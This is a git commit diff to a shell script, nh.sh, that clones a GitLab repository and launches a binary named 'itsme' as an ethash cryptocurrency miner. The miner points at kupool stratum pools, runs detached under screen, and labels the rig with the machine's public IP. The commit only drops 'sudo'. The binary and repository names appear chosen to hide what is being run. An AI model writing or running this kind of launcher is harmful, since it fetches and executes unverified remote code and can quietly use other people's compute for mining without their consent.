ddc0ea31452693b19463fbe35420dc24f4340e43
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-06-27 11:37:03 +0700

    Update nh.sh

--- nh.sh
+++ nh.sh
@@ -6,4 +6,4 @@ screen -dmS harukan.sh 65 75
 git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
 cd sainame127
 chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./itsme -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
